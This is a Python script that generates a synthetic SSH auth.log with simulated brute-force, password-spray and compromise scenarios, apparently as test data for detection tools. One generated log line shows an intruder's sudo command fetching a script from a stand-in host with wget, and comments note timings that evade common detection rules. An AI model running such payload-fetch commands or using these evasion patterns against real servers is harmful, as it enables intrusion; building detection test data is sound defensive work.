#!/usr/bin/env python3
"""Generate a realistic, synthetic Linux auth.log with simulated SSH attacks.

Nothing here is real: hostnames, users and keys are made up, and attacker IPs
come from the RFC 5737 documentation ranges (192.0.2.0/24, 198.51.100.0/24,
203.0.113.0/24), which are never routed on the internet.

Usage:
    python scripts/generate_sample_log.py -o sample_auth.log
    python scripts/generate_sample_log.py --seed 7 --hours 48 --iso > auth.log

A ground-truth summary of injected attacks is printed to stderr.
"""

from __future__ import annotations

import argparse
import random
import string
import sys
from dataclasses import dataclass, field
from datetime import datetime, timedelta

HOST = "web01"

LEGIT_USERS = {
    # user: (uid, home IPs, preferred auth method)
    "alice": (1000, ["10.0.0.21", "192.168.1.50"], "publickey"),
    "bob": (1001, ["10.0.0.34"], "password"),
    "carol": (1002, ["10.0.0.77", "172.16.4.9"], "publickey"),
}
SYSTEM_USERS = {"root": 0, "deploy": 1003, "ubuntu": 1004}

DICTIONARY = [
    "root", "admin", "test", "user", "oracle", "postgres", "ubuntu", "guest",
    "ftpuser", "git", "pi", "mysql", "support", "deploy", "jenkins", "hadoop",
    "www-data", "nagios", "minecraft", "steam", "", "administrator", "dev",
]


@dataclass
class Generator:
    rng: random.Random
    iso: bool = False
    lines: list[tuple[datetime, str]] = field(default_factory=list)
    truth: list[str] = field(default_factory=list)
    _session: int = 1

    # -- low-level line writers ------------------------------------------------

    def _stamp(self, ts: datetime) -> str:
        if self.iso:
            return ts.strftime("%Y-%m-%dT%H:%M:%S.") + f"{ts.microsecond:06d}+00:00"
        return f"{ts:%b} {ts.day:>2} {ts:%H:%M:%S}"  # syslog pads day with a space

    def emit(self, ts: datetime, proc: str, msg: str) -> None:
        self.lines.append((ts, f"{self._stamp(ts)} {HOST} {proc}: {msg}"))

    def _pid(self) -> int:
        return self.rng.randint(1000, 65000)

    def _port(self) -> int:
        return self.rng.randint(32768, 60999)

    def _fingerprint(self) -> str:
        chars = string.ascii_letters + string.digits + "+/"
        return "SHA256:" + "".join(self.rng.choice(chars) for _ in range(43))

    def _tick(self, ts: datetime, lo: float = 0.05, hi: float = 0.6) -> datetime:
        return ts + timedelta(seconds=self.rng.uniform(lo, hi))

    # -- realistic multi-line sshd sequences --------------------------------

    def failed_attempt(self, ts: datetime, ip: str, user: str, close: bool = True) -> datetime:
        """One wrong password, exactly as OpenSSH + PAM would log it."""
        pid, port = self._pid(), self._port()
        sshd = f"sshd[{pid}]"
        valid = user in SYSTEM_USERS or user in LEGIT_USERS
        if not valid:
            self.emit(ts, sshd, f"Invalid user {user} from {ip} port {port}")
            ts = self._tick(ts)
            self.emit(ts, sshd, "pam_unix(sshd:auth): check pass; user unknown")
            ts = self._tick(ts)
            self.emit(ts, sshd, "pam_unix(sshd:auth): authentication failure; logname= uid=0 "
                                f"euid=0 tty=ssh ruser= rhost={ip}")
        else:
            self.emit(ts, sshd, "pam_unix(sshd:auth): authentication failure; logname= uid=0 "
                                f"euid=0 tty=ssh ruser= rhost={ip}  user={user}")
        ts = self._tick(ts, 1.5, 3.0)  # PAM's fail delay
        prefix = "" if valid else "invalid user "
        self.emit(ts, sshd, f"Failed password for {prefix}{user} from {ip} port {port} ssh2")
        if close:
            ts = self._tick(ts)
            self.emit(ts, sshd, f"Connection closed by {'' if valid else 'invalid user '}"
                                f"{user} {ip} port {port} [preauth]")
        return ts

    def successful_login(self, ts: datetime, ip: str, user: str, method: str,
                         duration: timedelta | None = None) -> datetime:
        pid, port = self._pid(), self._port()
        sshd = f"sshd[{pid}]"
        uid = LEGIT_USERS[user][0] if user in LEGIT_USERS else SYSTEM_USERS[user]
        suffix = f": ED25519 {self._fingerprint()}" if method == "publickey" else ""
        self.emit(ts, sshd, f"Accepted {method} for {user} from {ip} port {port} ssh2{suffix}")
        ts = self._tick(ts, 0.01, 0.05)
        self.emit(ts, sshd, f"pam_unix(sshd:session): session opened for user {user}(uid={uid}) by (uid=0)")
        sid = self._session
        self._session += 1
        self.emit(self._tick(ts), "systemd-logind[612]", f"New session {sid} of user {user}.")

        end = ts + (duration or timedelta(minutes=self.rng.randint(2, 90)))
        self.emit(end, sshd, f"Received disconnect from {ip} port {port}:11: disconnected by user")
        self.emit(self._tick(end), sshd, f"Disconnected from user {user} {ip} port {port}")
        self.emit(self._tick(end), sshd, f"pam_unix(sshd:session): session closed for user {user}")
        self.emit(self._tick(end, 0.1, 0.4), "systemd-logind[612]", f"Session {sid} logged out. "
                                                                    "Waiting for processes to exit.")
        return ts

    # -- scenarios ---------------------------------------------------------

    def background_noise(self, start: datetime, end: datetime) -> None:
        """CRON jobs, sudo usage and port scanners that never try a password."""
        ts = start
        while ts < end:
            pid = self._pid()
            self.emit(ts, f"CRON[{pid}]", "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)")
            self.emit(ts + timedelta(seconds=1), f"CRON[{pid}]", "pam_unix(cron:session): session closed for user root")
            ts += timedelta(minutes=self.rng.choice([10, 15, 17, 30]))

        for _ in range(self.rng.randint(15, 30)):
            ts = start + (end - start) * self.rng.random()
            ip = f"198.51.100.{self.rng.randint(1, 254)}"
            sshd = f"sshd[{self._pid()}]"
            port = self._port()
            self.emit(ts, sshd, self.rng.choice([
                f"Connection closed by {ip} port {port} [preauth]",
                f"Received disconnect from {ip} port {port}:11: Bye Bye [preauth]",
                f"error: kex_exchange_identification: Connection closed by remote host",
                f"banner exchange: Connection from {ip} port {port}: invalid format",
            ]))

    def legit_activity(self, start: datetime, end: datetime) -> None:
        """Normal users logging in during the day, with the odd typo."""
        day = start.replace(hour=0, minute=0, second=0, microsecond=0)
        while day < end:
            for user, (uid, ips, method) in LEGIT_USERS.items():
                for _ in range(self.rng.randint(1, 4)):
                    ts = day + timedelta(hours=self.rng.uniform(8, 19))
                    if not (start <= ts < end):
                        continue
                    ip = self.rng.choice(ips)
                    if method == "password" and self.rng.random() < 0.3:
                        for _ in range(self.rng.randint(1, 2)):  # typos
                            ts = self.failed_attempt(ts, ip, user) + timedelta(seconds=self.rng.uniform(3, 10))
                    self.successful_login(ts, ip, user, method)
                    sudo_ts = ts + timedelta(minutes=self.rng.uniform(1, 5))
                    self.emit(sudo_ts, "sudo", f"   {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; "
                                               "COMMAND=/usr/bin/systemctl status nginx")
            day += timedelta(days=1)

    def fast_bruteforce(self, ts: datetime, ip: str, attempts: int) -> None:
        start = ts
        for _ in range(attempts):
            ts = self.failed_attempt(ts, ip, self.rng.choice(DICTIONARY))
            ts += timedelta(seconds=self.rng.uniform(0.5, 4))
        self.truth.append(f"fast brute force      {ip:<16} {attempts} failures, "
                          f"{start:%H:%M}-{ts:%H:%M}  (no success)")

    def compromise(self, ts: datetime, ip: str, attempts: int, user: str) -> None:
        start = ts
        for _ in range(attempts):
            ts = self.failed_attempt(ts, ip, user)
            ts += timedelta(seconds=self.rng.uniform(1, 6))
        self.successful_login(ts, ip, user, "password", duration=timedelta(minutes=23))
        # What an intruder might do next
        self.emit(ts + timedelta(minutes=2), "sudo", f"  {user} : TTY=pts/1 ; PWD=/home/{user} ; "
                                                    "USER=root ; COMMAND=/usr/bin/wget http://203.0.113.66/x.sh")
        self.truth.append(f"COMPROMISE            {ip:<16} {attempts} failures then SUCCESS as "
                          f"'{user}' at {ts:%Y-%m-%d %H:%M:%S}")

    def slow_bruteforce(self, ts: datetime, ip: str, attempts: int) -> None:
        start = ts
        for _ in range(attempts):
            ts = self.failed_attempt(ts, ip, self.rng.choice(DICTIONARY))
            ts += timedelta(minutes=self.rng.uniform(3, 4))
        self.truth.append(f"slow brute force      {ip:<16} {attempts} failures, ~1 per 3-4 min, "
                          f"{start:%H:%M}-{ts:%H:%M}  (evades default 5-in-5min rule)")

    def distributed_spray(self, ts: datetime, n_ips: int, per_ip: int) -> None:
        for i in range(n_ips):
            ip = f"192.0.2.{10 + i}"
            t = ts + timedelta(minutes=self.rng.uniform(0, 60))
            for _ in range(per_ip):
                t = self.failed_attempt(t, ip, self.rng.choice(["root", "admin", "ubuntu"]))
                t += timedelta(seconds=self.rng.uniform(5, 30))
        self.truth.append(f"distributed spray     192.0.2.10-{10 + n_ips - 1:<5} {n_ips} IPs x {per_ip} "
                          f"failures  (evades per-IP detection)")

    def render(self) -> str:
        self.lines.sort(key=lambda x: x[0])
        return "".join(line + "\n" for _, line in self.lines)


def generate(start: datetime, hours: int = 24, seed: int | None = 42, iso: bool = False) -> tuple[str, list[str]]:
    """Return (log_text, ground_truth_lines)."""
    rng = random.Random(seed)
    g = Generator(rng=rng, iso=iso)
    end = start + timedelta(hours=hours)
    at = lambda frac: start + (end - start) * frac  # point in the time range

    g.background_noise(start, end)
    g.legit_activity(start, end)
    g.fast_bruteforce(at(0.12), "203.0.113.45", attempts=150)
    g.distributed_spray(at(0.30), n_ips=25, per_ip=2)
    g.slow_bruteforce(at(0.40), "198.51.100.200", attempts=40)
    g.compromise(at(0.75), "203.0.113.99", attempts=40, user="deploy")
    return g.render(), g.truth


def main(argv: list[str] | None = None) -> int:
    p = argparse.ArgumentParser(description="Generate a synthetic SSH auth.log with simulated attacks.")
    p.add_argument("-o", "--output", help="write to this file (default: stdout)")
    p.add_argument("--start", help="start time, e.g. '2026-10-28 00:00' (default: 24h ago, midnight)")
    p.add_argument("--hours", type=int, default=24, help="how many hours of log to generate (default: 24)")
    p.add_argument("--seed", type=int, default=42, help="random seed for reproducible output (default: 42)")
    p.add_argument("--iso", action="store_true", help="use ISO-8601 timestamps instead of classic syslog")
    p.add_argument("-q", "--quiet", action="store_true", help="don't print the ground-truth summary")
    args = p.parse_args(argv)

    if args.start:
        start = datetime.fromisoformat(args.start)
    else:
        start = (datetime.now() - timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0)

    text, truth = generate(start, args.hours, args.seed, args.iso)
    if args.output:
        with open(args.output, "w", encoding="utf-8") as f:
            f.write(text)
    else:
        sys.stdout.write(text)

    if not args.quiet:
        print(f"\nGenerated {text.count(chr(10))} lines starting {start:%Y-%m-%d %H:%M}. "
              "Injected attacks (ground truth):", file=sys.stderr)
        for t in truth:
            print("  - " + t, file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
